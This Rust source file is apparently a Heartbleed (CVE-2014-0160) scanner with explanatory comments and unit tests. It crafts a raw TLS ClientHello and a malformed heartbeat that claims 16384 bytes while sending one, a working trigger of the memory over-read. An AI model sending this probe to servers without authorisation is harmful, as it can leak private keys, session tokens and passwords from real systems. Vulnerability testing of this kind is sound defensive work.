/// Heartbleed Vulnerability Tester (CVE-2014-0160)
/// Test for the critical OpenSSL memory leak vulnerability
///
/// ✅ ZERO DEPENDENCIES - Raw TLS handshake from scratch
///
/// **What is Heartbleed?**
/// Heartbleed is a critical vulnerability in OpenSSL's TLS heartbeat extension.
/// It allows attackers to read up to 64KB of memory from the server, potentially
/// leaking:
/// - Private keys (RSA, ECDSA)
/// - Session tokens and cookies
/// - Usernames and passwords
/// - Sensitive business data
///
/// **How it works:**
/// 1. TLS heartbeat extension allows "keep-alive" messages
/// 2. Client sends heartbeat: "I'm sending 5 bytes: 'HELLO'"
/// 3. Server should echo: "HELLO"
/// 4. BUG: Server doesn't validate payload length
/// 5. Attack: "I'm sending 65535 bytes: 'A'" (but only send 1 byte)
/// 6. Server echoes 65535 bytes from memory (including secrets!)
///
/// **CVE-2014-0160**
/// - Discovered: April 2014
/// - Severity: CRITICAL (10.0 CVSS)
/// - Affected: OpenSSL 1.0.1 through 1.0.1f
/// - Impact: ~17% of all HTTPS servers (500,000+ sites)
///
/// **Works alongside:**
/// - testssl.sh (compare results)
/// - nmap heartbleed script (cross-validate)
/// - sslyze (complementary testing)
///
/// **Educational value:**
/// Read the code to understand how buffer over-read vulnerabilities work!

use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

/// Heartbleed test result
#[derive(Debug, Clone, PartialEq)]
pub enum HeartbleedResult {
    Vulnerable,      // Server is vulnerable to Heartbleed
    NotVulnerable,   // Server patched or doesn't support heartbeat
    NoHeartbeat,     // Server doesn't have heartbeat extension
    Timeout,         // Connection timeout (inconclusive)
    Error(String),   // Connection or protocol error
}

impl HeartbleedResult {
    pub fn is_vulnerable(&self) -> bool {
        matches!(self, HeartbleedResult::Vulnerable)
    }

    pub fn as_str(&self) -> &str {
        match self {
            HeartbleedResult::Vulnerable => "VULNERABLE",
            HeartbleedResult::NotVulnerable => "NOT VULNERABLE",
            HeartbleedResult::NoHeartbeat => "NO HEARTBEAT",
            HeartbleedResult::Timeout => "TIMEOUT",
            HeartbleedResult::Error(_) => "ERROR",
        }
    }
}

/// Heartbleed tester
pub struct HeartbleedTester {
    timeout: Duration,
}

impl HeartbleedTester {
    pub fn new() -> Self {
        Self {
            timeout: Duration::from_secs(10),
        }
    }

    pub fn with_timeout(timeout: Duration) -> Self {
        Self { timeout }
    }

    /// Test if server is vulnerable to Heartbleed
    ///
    /// This performs the following steps:
    /// 1. Connect to server via TCP
    /// 2. Send TLS ClientHello with heartbeat extension
    /// 3. Receive ServerHello (check if heartbeat is enabled)
    /// 4. Send malformed heartbeat request (payload_length > actual_payload)
    /// 5. Check if server responds with more data than we sent (= vulnerable!)
    pub fn test(&self, host: &str, port: u16) -> HeartbleedResult {
        match self.test_internal(host, port) {
            Ok(result) => result,
            Err(e) => HeartbleedResult::Error(e),
        }
    }

    fn test_internal(&self, host: &str, port: u16) -> Result<HeartbleedResult, String> {
        // Connect to server
        let addr = format!("{}:{}", host, port);
        let mut stream = TcpStream::connect_timeout(
            &addr.parse().map_err(|e| format!("Invalid address: {}", e))?,
            self.timeout,
        )
        .map_err(|e| format!("Connection failed: {}", e))?;

        stream
            .set_read_timeout(Some(self.timeout))
            .map_err(|e| format!("Failed to set timeout: {}", e))?;

        // Send ClientHello with heartbeat extension
        let client_hello = self.build_client_hello_with_heartbeat();
        stream
            .write_all(&client_hello)
            .map_err(|e| format!("Failed to send ClientHello: {}", e))?;

        // Read ServerHello
        let mut response = vec![0u8; 16384]; // 16KB buffer
        let n = stream
            .read(&mut response)
            .map_err(|e| format!("Failed to read ServerHello: {}", e))?;
        response.truncate(n);

        // Check if server supports heartbeat extension
        if !self.server_supports_heartbeat(&response) {
            return Ok(HeartbleedResult::NoHeartbeat);
        }

        // Complete handshake (skip for simplicity - we just need to test heartbeat)
        // In a full implementation, we'd exchange keys, Finished messages, etc.

        // Send malformed heartbeat request
        let heartbeat_request = self.build_malformed_heartbeat();
        stream
            .write_all(&heartbeat_request)
            .map_err(|e| format!("Failed to send heartbeat: {}", e))?;

        // Read heartbeat response
        let mut heartbeat_response = vec![0u8; 65535]; // Max TLS record size
        match stream.read(&mut heartbeat_response) {
            Ok(n) => {
                heartbeat_response.truncate(n);

                // Analyze response
                if self.is_heartbleed_response(&heartbeat_response) {
                    Ok(HeartbleedResult::Vulnerable)
                } else {
                    Ok(HeartbleedResult::NotVulnerable)
                }
            }
            Err(e) => {
                // Timeout or connection closed = probably not vulnerable
                if e.kind() == std::io::ErrorKind::WouldBlock
                    || e.kind() == std::io::ErrorKind::TimedOut
                {
                    Ok(HeartbleedResult::Timeout)
                } else {
                    Ok(HeartbleedResult::NotVulnerable)
                }
            }
        }
    }

    /// Build TLS ClientHello with heartbeat extension
    ///
    /// TLS Record Header (5 bytes):
    /// - Content Type: Handshake (0x16)
    /// - Version: TLS 1.2 (0x03 0x03)
    /// - Length: (variable)
    ///
    /// Handshake Protocol:
    /// - Type: ClientHello (0x01)
    /// - Length: (variable)
    /// - Version: TLS 1.2
    /// - Random: 32 bytes
    /// - Session ID: empty
    /// - Cipher Suites: AES-128-CBC-SHA
    /// - Compression: null
    /// - Extensions: heartbeat (0x000f)
    fn build_client_hello_with_heartbeat(&self) -> Vec<u8> {
        let mut hello = Vec::new();

        // TLS Record Header
        hello.push(0x16); // Content Type: Handshake
        hello.push(0x03); // Version: TLS 1.2
        hello.push(0x03);

        // Placeholder for length (will fill later)
        let length_pos = hello.len();
        hello.push(0x00);
        hello.push(0x00);

        // Handshake: ClientHello
        hello.push(0x01); // Type: ClientHello

        // Handshake length placeholder
        let handshake_length_pos = hello.len();
        hello.push(0x00);
        hello.push(0x00);
        hello.push(0x00);

        // Client Version: TLS 1.2
        hello.push(0x03);
        hello.push(0x03);

        // Random: 32 bytes (timestamp + random)
        let timestamp = (std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs() as u32)
            .to_be_bytes();
        hello.extend_from_slice(&timestamp);
        hello.extend_from_slice(&[0x41; 28]); // Dummy random bytes

        // Session ID: empty
        hello.push(0x00);

        // Cipher Suites: 1 cipher
        hello.push(0x00);
        hello.push(0x02); // Length: 2 bytes
        hello.push(0x00);
        hello.push(0x2f); // TLS_RSA_WITH_AES_128_CBC_SHA

        // Compression Methods: null
        hello.push(0x01); // Length: 1
        hello.push(0x00); // null compression

        // Extensions
        let extensions_length_pos = hello.len();
        hello.push(0x00);
        hello.push(0x00); // Placeholder

        let extensions_start = hello.len();

        // Heartbeat extension (0x000f)
        hello.push(0x00);
        hello.push(0x0f); // Extension type: heartbeat
        hello.push(0x00);
        hello.push(0x01); // Length: 1 byte
        hello.push(0x01); // Mode: peer_allowed_to_send

        // Update extensions length
        let extensions_len = hello.len() - extensions_start;
        hello[extensions_length_pos] = ((extensions_len >> 8) & 0xff) as u8;
        hello[extensions_length_pos + 1] = (extensions_len & 0xff) as u8;

        // Update handshake length
        let handshake_len = hello.len() - handshake_length_pos - 3;
        hello[handshake_length_pos] = ((handshake_len >> 16) & 0xff) as u8;
        hello[handshake_length_pos + 1] = ((handshake_len >> 8) & 0xff) as u8;
        hello[handshake_length_pos + 2] = (handshake_len & 0xff) as u8;

        // Update record length
        let record_len = hello.len() - length_pos - 2;
        hello[length_pos] = ((record_len >> 8) & 0xff) as u8;
        hello[length_pos + 1] = (record_len & 0xff) as u8;

        hello
    }

    /// Build malformed heartbeat request
    ///
    /// TLS Heartbeat Protocol (RFC 6520):
    /// - Content Type: Heartbeat (0x18)
    /// - Version: TLS 1.2
    /// - Length: actual length
    /// - Heartbeat Type: request (0x01)
    /// - Payload Length: **LYING** - we claim 16384 bytes but send only 1!
    /// - Payload: "A" (1 byte)
    /// - Padding: 16 bytes (required by spec)
    ///
    /// If vulnerable, server will echo 16384 bytes from memory!
    fn build_malformed_heartbeat(&self) -> Vec<u8> {
        let mut heartbeat = Vec::new();

        // TLS Record Header
        heartbeat.push(0x18); // Content Type: Heartbeat
        heartbeat.push(0x03); // Version: TLS 1.2
        heartbeat.push(0x03);
        heartbeat.push(0x00);
        heartbeat.push(0x13); // Length: 19 bytes (1 + 2 + 1 + 16)

        // Heartbeat Message
        heartbeat.push(0x01); // Type: Request

        // Payload Length: MALFORMED - claim 16384 bytes!
        heartbeat.push(0x40); // 0x4000 = 16384
        heartbeat.push(0x00);

        // Actual Payload: only 1 byte!
        heartbeat.push(0x41); // 'A'

        // Padding: 16 bytes (required)
        heartbeat.extend_from_slice(&[0x00; 16]);

        heartbeat
    }

    /// Check if ServerHello supports heartbeat extension
    fn server_supports_heartbeat(&self, response: &[u8]) -> bool {
        // Simple check: look for heartbeat extension (0x000f) in ServerHello
        // A proper implementation would parse the TLS handshake properly
        for i in 0..response.len().saturating_sub(2) {
            if response[i] == 0x00 && response[i + 1] == 0x0f {
                return true;
            }
        }
        false
    }

    /// Check if response indicates Heartbleed vulnerability
    ///
    /// Vulnerable response characteristics:
    /// - Content Type: Heartbeat (0x18)
    /// - Payload length > what we sent (we sent 1 byte, server echoes 16384!)
    /// - Response contains memory contents (not just our 'A')
    fn is_heartbleed_response(&self, response: &[u8]) -> bool {
        if response.len() < 5 {
            return false;
        }

        // Check if it's a heartbeat response (0x18)
        if response[0] != 0x18 {
            return false;
        }

        // Get payload length from TLS record
        let record_length = ((response[3] as usize) << 8) | (response[4] as usize);

        // Vulnerable if response is much larger than our 1-byte payload
        // Vulnerable servers will echo our claimed length (16384 bytes)
        if record_length > 100 {
            // More than 100 bytes = likely vulnerable
            return true;
        }

        // Also check if response contains unexpected data (memory leak)
        if response.len() > 50 {
            // Look for non-zero bytes that aren't our 'A'
            let non_zero_count = response.iter().filter(|&&b| b != 0x00 && b != 0x41).count();
            if non_zero_count > 10 {
                return true; // Likely contains leaked memory
            }
        }

        false
    }
}

impl Default for HeartbleedTester {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_client_hello_structure() {
        let tester = HeartbleedTester::new();
        let hello = tester.build_client_hello_with_heartbeat();

        // Check TLS record header
        assert_eq!(hello[0], 0x16); // Handshake
        assert_eq!(hello[1], 0x03); // TLS 1.2
        assert_eq!(hello[2], 0x03);

        // Check handshake type
        assert_eq!(hello[5], 0x01); // ClientHello
    }

    #[test]
    fn test_malformed_heartbeat_structure() {
        let tester = HeartbleedTester::new();
        let heartbeat = tester.build_malformed_heartbeat();

        // Check content type
        assert_eq!(heartbeat[0], 0x18); // Heartbeat

        // Check heartbeat type
        assert_eq!(heartbeat[5], 0x01); // Request

        // Check payload length (malformed!)
        let claimed_length = ((heartbeat[6] as u16) << 8) | (heartbeat[7] as u16);
        assert_eq!(claimed_length, 16384); // Claims 16KB

        // But actual payload is only 1 byte!
        assert_eq!(heartbeat[8], 0x41); // 'A'
    }

    #[test]
    fn test_heartbleed_detection() {
        let tester = HeartbleedTester::new();

        // Not a heartbeat response
        let normal_response = vec![0x16, 0x03, 0x03, 0x00, 0x10];
        assert!(!tester.is_heartbleed_response(&normal_response));

        // Short heartbeat response (not vulnerable)
        let short_response = vec![0x18, 0x03, 0x03, 0x00, 0x03, 0x02, 0x00, 0x01, 0x41];
        assert!(!tester.is_heartbleed_response(&short_response));

        // Large heartbeat response (VULNERABLE!)
        let mut vuln_response = vec![0x18, 0x03, 0x03, 0x40, 0x00]; // 16KB claimed
        vuln_response.extend_from_slice(&[0x41; 16384]); // Actual data
        assert!(tester.is_heartbleed_response(&vuln_response));
    }
}
